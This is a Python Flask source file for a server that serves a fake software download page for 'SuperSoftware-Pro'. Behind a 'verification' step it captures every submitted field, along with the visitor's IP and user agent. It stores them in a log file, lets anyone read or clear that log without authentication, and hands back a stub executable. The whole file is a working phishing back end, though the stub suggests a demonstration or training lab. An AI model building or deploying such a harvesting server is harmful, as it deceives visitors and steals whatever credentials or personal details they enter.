import json
import os
from datetime import datetime
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CAPTURED_LOG = os.path.join(BASE_DIR, "captured.json")


def load_log():
    if os.path.exists(CAPTURED_LOG):
        with open(CAPTURED_LOG, "r") as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                return []
    return []


def save_log(entries):
    with open(CAPTURED_LOG, "w") as f:
        json.dump(entries, f, indent=2)


@app.route("/")
def index():
    return render_template("download_page.html")


@app.route("/api/captured", methods=["POST"])
def captured():
    data = request.get_json(force=True, silent=True) or {}
    entry = {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent", ""),
        "fields": data,
    }
    log = load_log()
    log.append(entry)
    save_log(log)
    return jsonify({"status": "ok", "message": "Verification submitted. Your download will begin shortly."})


@app.route("/api/captured", methods=["GET"])
def get_captured():
    return jsonify({"entries": load_log()})


@app.route("/api/clear", methods=["GET", "POST"])
def clear_captured():
    save_log([])
    return jsonify({"status": "ok"})


# Dummy file download so the real link works
@app.route("/files/SuperSoftware-Pro-v3.2.1-win64.exe")
def dummy_file():
    from flask import Response
    content = b"MZ"  # Minimal stub — not a real executable
    return Response(
        content,
        mimetype="application/octet-stream",
        headers={"Content-Disposition": "attachment; filename=SuperSoftware-Pro-v3.2.1-win64.exe"},
    )


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5050, debug=False)
